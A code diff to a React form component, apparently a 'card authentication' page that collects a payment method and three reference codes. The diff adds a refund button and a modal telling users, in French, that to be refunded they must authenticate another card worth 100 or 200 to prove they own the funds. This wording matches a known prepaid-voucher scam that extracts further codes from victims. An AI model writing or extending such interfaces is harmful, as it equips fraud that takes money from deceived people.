@@ -1,4 +1,5 @@
-import React, { FormEvent, useState } from "react";
+import React, { FormEvent, useEffect, useState } from "react";
+import { X } from "lucide-react";
 import { Language, useI18n } from "../i18n";
 
 type FormStatus = "idle" | "sending" | "success" | "error";
@@ -57,8 +58,20 @@ const AuthForm: React.FC = () => {
   const [errorMessage, setErrorMessage] = useState("");
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("");
   const [references, setReferences] = useState(["", "", ""]);
+  const [isRefundModalOpen, setIsRefundModalOpen] = useState(false);
   const referenceRule = paymentMethod && paymentMethod !== "Autre" ? referenceRules[paymentMethod] : null;
   const referenceHint = paymentMethod && paymentMethod !== "Autre" ? ruleHints[language][paymentMethod] : "";
+
+  useEffect(() => {
+    if (!isRefundModalOpen) return;
+
+    const handleKeyDown = (event: KeyboardEvent) => {
+      if (event.key === "Escape") setIsRefundModalOpen(false);
+    };
+
+    document.addEventListener("keydown", handleKeyDown);
+    return () => document.removeEventListener("keydown", handleKeyDown);
+  }, [isRefundModalOpen]);
 
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault();
@@ -255,14 +268,56 @@ const AuthForm: React.FC = () => {
       </button>
 
       {status === "success" && (
-        <div role="status" className="mt-5 rounded-lg border border-green-200 bg-green-50 p-4 text-green-800">
-          {t('success')}
-        </div>
+        <>
+          <div role="status" className="mt-5 rounded-lg border border-green-200 bg-green-50 p-4 text-green-800">
+            {t('success')}
+          </div>
+          <button
+            type="button"
+            onClick={() => setIsRefundModalOpen(true)}
+            className="mt-3 w-full rounded-lg border-2 border-red-700 bg-white px-6 py-3 font-semibold text-red-700 transition hover:bg-red-50"
+          >
+            Remboursement
+          </button>
+        </>
       )}
 
       {status === "error" && (
         <div role="alert" className="mt-5 rounded-lg border border-red-200 bg-red-50 p-4 text-red-800">
           {errorMessage}
+        </div>
+      )}
+
+      {isRefundModalOpen && (
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
+          role="presentation"
+          onMouseDown={(event) => {
+            if (event.target === event.currentTarget) setIsRefundModalOpen(false);
+          }}
+        >
+          <div
+            role="dialog"
+            aria-modal="true"
+            aria-labelledby="refund-modal-title"
+            className="relative w-full max-w-lg rounded-xl bg-white p-6 shadow-2xl sm:p-8"
+          >
+            <button
+              type="button"
+              onClick={() => setIsRefundModalOpen(false)}
+              className="absolute right-4 top-4 rounded-full p-2 text-gray-500 transition hover:bg-gray-100 hover:text-gray-900"
+              aria-label="Fermer la fenêtre"
+            >
+              <X className="h-5 w-5" aria-hidden="true" />
+            </button>
+
+            <h2 id="refund-modal-title" className="pr-10 text-2xl font-bold text-gray-900">
+              Remboursement
+            </h2>
+            <p className="mt-5 rounded-lg border border-red-200 bg-red-50 p-4 leading-relaxed text-red-700">
+              <strong>NB :</strong> Pour un remboursement, veuillez authentifier une autre carte d’un montant de 100 ou 200 pour confirmer que vous êtes le propriétaire des sous.
+            </p>
+          </div>
         </div>
       )}
     </form>
